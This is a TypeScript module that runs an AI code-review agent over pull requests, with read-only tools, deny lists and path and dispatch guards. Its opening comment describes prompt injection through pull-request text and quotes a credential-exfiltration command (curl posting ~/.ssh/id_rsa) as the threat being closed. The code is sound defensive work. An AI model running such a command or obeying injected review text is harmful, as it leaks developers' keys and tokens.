import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import type { SDKResultMessage } from '@anthropic-ai/claude-agent-sdk';
import { TICKET_REVIEW_PEER_MAX_FOR_PR_REVIEW, type ClaudeFindingLens } from '@pierre-review/shared';
import { claudeExecutableOptions, loadAgentSdk } from '../ai/runtime.js';
import type { RunReviewArgs, RunReviewResult } from '../pro/contract.js';
import { config } from '../config.js';
import { submitReviewShape, type SubmitReviewPayload } from './schema.js';
import { applyClaudeReviewAuth } from './auth.js';
import {
  cleanupCloneCache,
  prepPeerWorktrees,
  prepWorktree,
  removeWorktreeLocked,
} from './clone-manager.js';
import { createPathGuard, pathGuardHook } from './path-guard.js';
import { relatedCheckoutsSection } from './claude-review/prompts.js';
import { sdkModelOptions } from './model-options.js';
import { estimateCostUsd } from './pricing.js';
import { mapSubmittedReview } from './submit-map.js';
import {
  DISPATCH_TOOL_NAMES,
  createDispatchGuard,
  specialistAgents,
  type DispatchGuard,
} from './claude-review/specialists.js';
import {
  recordUsage,
  sumModelUsage,
  sumUsageMap,
  type UsageTokens,
} from './usage.js';

// The security-sensitive HALF of ctx.review.runReview (the plugin owns routing/prompts/
// persistence; core owns the SDK run). Given a resolved mode + the plugin-built prompts +
// the stripped diff (for anchoring), it clones/worktrees, runs the Agent SDK with the
// in-process submit_review MCP tool, applies the auth env policy, streams progress, anchors
// the findings, and RETURNS the structured result — it never touches the DB or throws for
// an expected failure (it returns { submitted:false } / { aborted:true } with telemetry).

// Read-only tool surface for a WORKTREE review. submit_review is the ONLY way structured
// output leaves the agent.
//
// ---- Bash is deliberately ABSENT (this used to include it) ----
//
// A code review is the textbook prompt-injection target: every byte the model reads — the PR
// title, the description, the diff, the review comments — was written by whoever opened the pull
// request, which on a public repo is anyone. Combine that untrusted instruction channel with
// `permissionMode: 'bypassPermissions'` (below) and a shell, and the review agent becomes a
// remote code-execution path on the developer's own machine, with their `gh` token, SSH keys,
// `~/.aws/credentials` and `.env` files all in reach and `curl` available to post them onwards.
//
// The old `DISALLOWED_TOOLS` blocklist (`Bash(rm *)`, `Bash(sudo *)`, …) was never a defence
// against that. It stops a handful of literal command prefixes; it does nothing about
// `curl -d @~/.ssh/id_rsa https://…`, `python -c …`, or any of the thousand equivalent spellings.
// A blocklist cannot enumerate the badness of a shell.
//
// What Bash bought was `git log` / `git show` for extra context, and the prompt already told the
// agent to "prefer the dedicated Read/Glob/Grep tools over shelling out" — so this trades a
// modest amount of optional context for closing arbitrary command execution driven by a stranger's
// pull-request text. Read/Glob/Grep remain, which is what actually reviews code.
//
// If shell access is ever genuinely needed here, the way back is a container/VM boundary or an
// explicit `canUseTool` allowlist under a non-bypass permission mode — NOT re-adding 'Bash' with
// a longer blocklist.
const WORKTREE_TOOLS = ['Read', 'Glob', 'Grep', 'mcp__review__submit_review'];
// A deep (worktree) review also gets the sub-agent dispatch tool, so the lead can consult its
// specialists (claude-review/specialists.ts). Each specialist is itself Read/Glob/Grep only, and
// every dispatch passes the PreToolUse guard below: catalogue names only, at most
// CLAUDE_REVIEW_MAX_SPECIALISTS per review, foreground, the lead's model.
// A DIFF-ONLY review is tool-less: the agent has the full diff in its prompt and no
// repository to explore, so submit_review is the only tool it gets.
const DIFF_ONLY_TOOLS = ['mcp__review__submit_review'];
// Per-model effort + thinking options live in ./model-options.ts (ONE table, shared with
// coding/agent.ts). ⚠ Opus 5.5 400s on disabled thinking, a thinking budget and a forced
// tool_choice — none of which this run sends.
// Deny list. `Bash` is denied OUTRIGHT rather than by command pattern — see WORKTREE_TOOLS
// above for why a per-command blocklist is not a security boundary when the model's input is
// attacker-authored. Belt and braces: Bash is also absent from the allow list, so this is the
// second of two independent reasons it cannot run.
export const DISALLOWED_TOOLS = [
  'Write',
  'Edit',
  'MultiEdit',
  'NotebookEdit',
  'Bash',
  'WebFetch',
  'WebSearch',
];

/**
 * The tool policy for one run. Pure, so the "specialists only on the deep route" rule is testable
 * without the SDK. A diff-only run, or a worktree run offered no specialists, gets the dispatch tool
 * DENIED outright — otherwise the SDK's built-in agent types (which inherit every tool) would be
 * one call away.
 */
export function reviewToolPolicy(
  mode: 'diff_only' | 'worktree',
  offered: readonly ClaudeFindingLens[] | undefined,
): { allowedTools: string[]; disallowedTools: string[]; specialists: ClaudeFindingLens[] } {
  const specialists = mode === 'worktree' ? [...(offered ?? [])] : [];
  if (specialists.length > 0) {
    return {
      allowedTools: [...WORKTREE_TOOLS, ...DISPATCH_TOOL_NAMES],
      disallowedTools: [...DISALLOWED_TOOLS],
      specialists,
    };
  }
  return {
    allowedTools: mode === 'worktree' ? [...WORKTREE_TOOLS] : [...DIFF_ONLY_TOOLS],
    disallowedTools: [...DISALLOWED_TOOLS, ...DISPATCH_TOOL_NAMES],
    specialists,
  };
}

// How many recent-activity lines to keep in the live progress ring buffer.
const ACTIVITY_LOG_CAP = 25;

export async function runReview(args: RunReviewArgs): Promise<RunReviewResult> {
  const { model, mode, onProgress, abortController } = args;

  let worktreePath: string | null = null;
  let repoCloneDir: string | null = null;
  let tempCwd: string | null = null;
  // The ticket peers' read-only checkouts (deep runs only); `cleanup` removes them in finally.
  let peerCleanup: (() => Promise<void>) | null = null;
  let result: SDKResultMessage | null = null;
  let restoreEnv: (() => void) | null = null;
  // Per-message usage keyed by message UUID (latest-wins): the SDK re-emits a message per
  // turn, so a naive SUM double-counts (~2×). The PERSISTED totals prefer the result
  // message's authoritative `modelUsage` (see telemetry()).
  const usageByUuid = new Map<string, UsageTokens>();
  const telemetry = (): Pick<
    RunReviewResult,
    'costUsd' | 'inputTokens' | 'outputTokens' | 'cacheReadTokens' | 'cacheCreationTokens' | 'numTurns'
  > => {
    const usage = sumModelUsage(result) ?? sumUsageMap(usageByUuid);
    const hasUsage = usage.inputTokens + usage.outputTokens + usage.cacheReadTokens > 0;
    return {
      costUsd: result?.total_cost_usd ?? (hasUsage ? estimateCostUsd(model, usage) : null),
      inputTokens: usage.inputTokens,
      outputTokens: usage.outputTokens,
      cacheReadTokens: usage.cacheReadTokens,
      cacheCreationTokens: usage.cacheCreationTokens,
      numTurns: result?.num_turns ?? null,
    };
  };
  const fail = (failureReason: string | undefined, aborted: boolean): RunReviewResult => ({
    submitted: false,
    failureReason,
    scope: null,
    summary: '',
    verdict: 'COMMENT',
    findings: [],
    ...telemetry(),
    aborted,
  });

  try {
    // Working directory + tool surface per mode. A worktree review clones + checks out the
    // head and gets the read-only file tools; a diff-only review is TOOL-LESS with a
    // throwaway cwd and NO clone (the dominant per-run cost) — the whole change is in its prompt.
    let cwd: string;
    let maxTurns: number;
    let prompt = args.prompt;
    // The ticket peers' checkouts, readable beside cwd (empty unless a deep run was handed peers).
    const peerDirs: string[] = [];
    const policy = reviewToolPolicy(mode, args.specialists);
    if (mode === 'worktree') {
      onProgress({ phase: 'cloning', reviewMode: mode });
      ({ repoCloneDir, worktreePath } = await prepWorktree(
        args.owner,
        args.name,
        args.prNumber,
        args.headSha,
      ));
      cwd = worktreePath;
      maxTurns = config.reviewMaxTurns;
      // OTHER PRs ON THE SAME TICKET, read-only, for cross-repo interactions (claude-review/
      // prompts.ts "Related PRs"). A peer that fails to check out is said so in the prompt and the
      // review goes on: peer context is optional, the review of THIS PR is not.
      const peers = (args.peers ?? []).slice(0, TICKET_REVIEW_PEER_MAX_FOR_PR_REVIEW);
      if (peers.length > 0) {
        const prepared = await prepPeerWorktrees(
          peers.map((p) => ({ owner: p.owner, name: p.name, number: p.prNumber, headSha: p.headSha })),
        );
        peerCleanup = prepared.cleanup;
        const checkouts = peers.map((p, i) => ({ ref: p.ref, path: prepared.peers[i]?.path ?? null }));
        for (const c of checkouts) if (c.path) peerDirs.push(c.path);
        prompt = `${prompt}\n${relatedCheckoutsSection(checkouts)}`;
      }
    } else {
      tempCwd = mkdtempSync(join(tmpdir(), 'pierre-review-'));
      cwd = tempCwd;
      maxTurns = config.reviewDiffOnlyMaxTurns;
    }
    // Effort guides thinking depth + token spend — the dominant cost knob. Per-mode, and only
    // for models that accept it (Haiku rejects `effort`; it runs unset). Opus 5.5 also gets an
    // explicit adaptive-thinking config (see model-options.ts).
    const modelOptions = sdkModelOptions(model, mode);

    // Establish this run's auth (prefer ambient, strip an explicit key). The plugin decides
    // whether it's safe to mutate process.env (its concurrency === 1); restored in finally.
    restoreEnv = applyClaudeReviewAuth(args.applyAuthEnv);

    // ---- run the agent ----
    // The SDK and zod come from the AI runtime (ai/runtime.ts) — downloaded on first use for an
    // npm install. A missing runtime throws here and lands in the catch as a readable failure.
    const { createSdkMcpServer, query, tool } = await loadAgentSdk();
    const reviewShape = await submitReviewShape();
    let captured: SubmitReviewPayload | null = null;
    const server = createSdkMcpServer({
      name: 'review',
      version: '1.0.0',
      tools: [
        tool(
          'submit_review',
          'Submit your structured review. Call this EXACTLY once, at the end.',
          reviewShape,
          async (a) => {
            captured = a as unknown as SubmitReviewPayload;
            return { content: [{ type: 'text', text: 'Review recorded.' }] };
          },
        ),
      ],
    });

    // Deep review: the specialist catalogue + the dispatch guard (a fresh count per run).
    const guard: DispatchGuard | null =
      policy.specialists.length > 0 ? createDispatchGuard(policy.specialists) : null;
    // ⚠ THE PATH GUARD, on EVERY run (review/path-guard.ts): under bypassPermissions nothing else
    // confines an absolute path, and the prompt is attacker-authored. The file tools may read cwd
    // and the peers' checkouts, nothing else. (A diff-only run has no file tools; it is guarded
    // anyway, so a future tool is never unconfined by default.)
    const pathGuard = createPathGuard(cwd, peerDirs);

    const q = query({
      prompt,
      options: {
        model,
        ...modelOptions,
        systemPrompt: args.systemPrompt,
        cwd,
        permissionMode: 'bypassPermissions',
        allowedTools: policy.allowedTools,
        disallowedTools: policy.disallowedTools,
        maxTurns,
        ...(peerDirs.length > 0 ? { additionalDirectories: peerDirs } : {}),
        ...(guard ? { agents: specialistAgents(policy.specialists) } : {}),
        // PreToolUse hooks run before the tool, and their deny holds under bypassPermissions
        // (canUseTool would never be asked). Every hook must allow a call for it to run.
        hooks: {
          PreToolUse: [
            pathGuardHook(pathGuard),
            // ⚠ THE SPECIALIST CAP LIVES HERE, not in the prompt.
            ...(guard
              ? [
                  {
                    hooks: [
                      async (input: { hook_event_name: string; tool_name?: string; tool_input?: unknown }) =>
                        input.hook_event_name === 'PreToolUse'
                          ? guard.decide(input.tool_name ?? '', input.tool_input)
                          : { continue: true },
                    ],
                  },
                ]
              : []),
          ],
        },
        // User-set per-review cap (local settings) when present, else the operator default —
        // plus headroom for each specialist a deep run is offered (they share this one budget).
        maxBudgetUsd: config.reviewBudgetUsd,
        // Don't inherit the host's .claude settings / CLAUDE.md / skills.
        settingSources: [],
        mcpServers: { review: server },
        abortController,
        // LIMN_CLAUDE_PATH → the user's own `claude` instead of the SDK's bundled binary.
        ...claudeExecutableOptions(),
      },
    });

    // Rolling, newest-last log of what the agent is doing right now, surfaced via onProgress.
    const activity: string[] = [];
    // Dispatch tool_use id → specialist name, so a specialist's own steps are labelled as its.
    const specialistByToolUse = new Map<string, string>();
    const pushActivity = (line: string): void => {
      const trimmed = line.trim();
      if (!trimmed) return;
      activity.push(trimmed);
      if (activity.length > ACTIVITY_LOG_CAP) activity.shift();
    };

    // Flip to 'reviewing' the moment setup is done — BEFORE the first model token — so the
    // prior phase doesn't linger through the agent's whole first turn.
    onProgress({ phase: 'reviewing', reviewMode: mode });

    for await (const message of q) {
      if (message.type === 'assistant') {
        try {
          recordUsage(usageByUuid, message);
        } catch {
          /* usage shape varies — never let it break the run */
        }
        try {
          for (const line of describeAssistantBlocks(message, specialistByToolUse)) pushActivity(line);
        } catch {
          /* never let progress derivation break the run */
        }
        const live = sumUsageMap(usageByUuid);
        onProgress({
          phase: 'reviewing',
          recentActivity: [...activity],
          reviewMode: mode,
          usage: { ...live, estCostUsd: estimateCostUsd(model, live) },
        });
      } else if (message.type === 'result') {
        result = message;
      }
    }

    if (!captured) {
      const reason =
        result && result.subtype !== 'success'
          ? `agent stopped (${result.subtype}) without submitting a review`
          : 'agent finished without calling submit_review';
      return fail(reason, false);
    }

    // ---- anchor (+ carry priorRef / followUp / ticket through verbatim) ----
    const payload: SubmitReviewPayload = captured;
    const mapped = mapSubmittedReview(payload, args.strippedDiff);

    return {
      submitted: true,
      ...mapped,
      ...telemetry(),
      aborted: false,
    };
  } catch (err) {
    // A user cancel aborts the SDK iterator, surfacing as an error here.
    if (abortController.signal.aborted) return fail(undefined, true);
    return fail(errorMessage(err), false);
  } finally {
    restoreEnv?.();
    if (peerCleanup) await peerCleanup().catch(() => {});
    if (repoCloneDir && worktreePath) {
      await removeWorktreeLocked(args.owner, args.name, repoCloneDir, worktreePath).catch(
        () => {},
      );
    }
    // Diff-only runs use a throwaway cwd — remove it (best-effort).
    if (tempCwd) {
      try {
        rmSync(tempCwd, { recursive: true, force: true });
      } catch {
        /* advisory cleanup — never surface */
      }
    }
    // Only a worktree run touched the clone cache. Defer LRU eviction (fire-and-forget) so
    // the review result returns promptly; cleanupCloneCache is best-effort and never throws.
    if (repoCloneDir) {
      setImmediate(() => {
        try {
          cleanupCloneCache();
        } catch {
          /* advisory cleanup — never surface */
        }
      });
    }
  }
}

function errorMessage(err: unknown): string {
  if (err instanceof Error) return err.message;
  return String(err);
}

const TEXT_SNIPPET_CAP = 120;
const BASH_CMD_CAP = 80;

/**
 * Turn one assistant message into a few short, human-readable progress lines: a label per
 * tool_use block plus a clipped snippet of any assistant text. Defensive throughout — the
 * SDK content/tool-input shapes vary, so every access is guarded and this never throws.
 */
export function describeAssistantBlocks(
  message: unknown,
  specialistByToolUse: Map<string, string> = new Map(),
): string[] {
  const lines: string[] = [];
  const m = message as { message?: { content?: unknown }; parent_tool_use_id?: unknown };
  const content = m?.message?.content;
  if (!Array.isArray(content)) return lines;
  // A message from inside a specialist carries the dispatch's tool_use id.
  const parent = typeof m.parent_tool_use_id === 'string' ? m.parent_tool_use_id : null;
  const owner = parent ? specialistByToolUse.get(parent) : undefined;
  const prefix = owner ? `${owner}: ` : '';

  for (const raw of content) {
    if (!raw || typeof raw !== 'object') continue;
    const block = raw as { type?: unknown; name?: unknown; input?: unknown; text?: unknown };

    if (block.type === 'tool_use') {
      const name = typeof block.name === 'string' ? block.name : 'Tool';
      const input =
        block.input && typeof block.input === 'object'
          ? (block.input as Record<string, unknown>)
          : {};
      if (DISPATCH_TOOL_NAMES.includes(name) && typeof (block as { id?: unknown }).id === 'string') {
        const type = typeof input.subagent_type === 'string' ? input.subagent_type : 'specialist';
        specialistByToolUse.set((block as { id: string }).id, type);
      }
      lines.push(prefix + labelToolUse(name, input));
    } else if (block.type === 'text' && typeof block.text === 'string') {
      const snippet = clip(block.text.replace(/\s+/g, ' ').trim(), TEXT_SNIPPET_CAP);
      if (snippet) lines.push(prefix + snippet);
    }
  }
  return lines;
}

/** Build a short label for a tool call from its name + a truncated first arg. */
function labelToolUse(name: string, input: Record<string, unknown>): string {
  const str = (v: unknown): string | null =>
    typeof v === 'string' && v.trim().length > 0 ? v.trim() : null;

  switch (name) {
    case 'Read': {
      const p = str(input.file_path) ?? str(input.path);
      return p ? `Read ${p}` : 'Read …';
    }
    case 'Glob': {
      const p = str(input.pattern);
      return p ? `Glob ${p}` : 'Glob …';
    }
    case 'Grep': {
      const p = str(input.pattern);
      return p ? `Grep "${clip(p, BASH_CMD_CAP)}"` : 'Grep …';
    }
    case 'Bash': {
      const c = str(input.command);
      return c ? `Bash ${clip(c, BASH_CMD_CAP)}` : 'Bash …';
    }
    case 'mcp__review__submit_review':
      return 'Submitting review…';
    case 'Agent':
    case 'Task': {
      const t = str(input.subagent_type);
      return t ? `Asking the ${t} specialist` : 'Asking a specialist';
    }
    default: {
      for (const key of Object.keys(input)) {
        const v = str(input[key]);
        if (v) return `${name} ${clip(v, BASH_CMD_CAP)}`;
      }
      return `${name} …`;
    }
  }
}

function clip(s: string, max: number): string {
  return s.length > max ? `${s.slice(0, max)}…` : s;
}
